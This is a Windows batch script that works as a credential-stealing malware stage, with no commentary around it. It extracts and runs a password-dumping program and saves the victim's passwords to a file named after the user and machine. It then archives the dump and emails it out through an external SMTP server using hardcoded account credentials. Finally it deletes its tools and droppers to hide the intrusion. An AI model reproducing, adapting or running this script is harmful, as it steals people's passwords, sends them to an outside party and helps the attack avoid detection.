ECHO off

mkdir out
ping 1.1.1.1 -n 1 -w 2000 > nul
rar e Pass*.rar

ping 1.1.1.1 -n 1 -w 2000 > nul

Pass.exe /min > c:\time\out\%username%--%computername%--pwd.txt

ping 1.1.1.1 -n 1 -w 30000 > nul

rar.exe a -df -dr c:\time\All c:\time\out\*.*

sendsmtp /HOST out.impresasemplice.it /PORT 25 /USERID admin@comuneorzivecchi.191.it /PASS Logan757. /FROM admin@comuneorzivecchi.191.it /TO admin@comuneorzivecchi.191.it /SUBJECT "%username%  %computername%"  /FILES All.rar

ping 1.1.1.1 -n 1 -w 60000 > nul

RMDIR /s /q out

ping 1.1.1.1 -n 1 -w 1000 > nul
del /F /S /Q "c:\time\*.rar"
ping 1.1.1.1 -n 1 -w 1000 > nul
del /F /S /Q "c:\time\pass.exe"
ping 1.1.1.1 -n 1 -w 1000 > nul
del /F /S /Q "c:\time\ORDINI.exe"
ping 1.1.1.1 -n 1 -w 1000 > nul
del /F /S /Q "c:\time\HideDown.vbs"
ping 1.1.1.1 -n 1 -w 1000 > nul
del /F /S /Q "c:\time\down.bat"
ping 1.1.1.1 -n 1 -w 1000 > nul
exit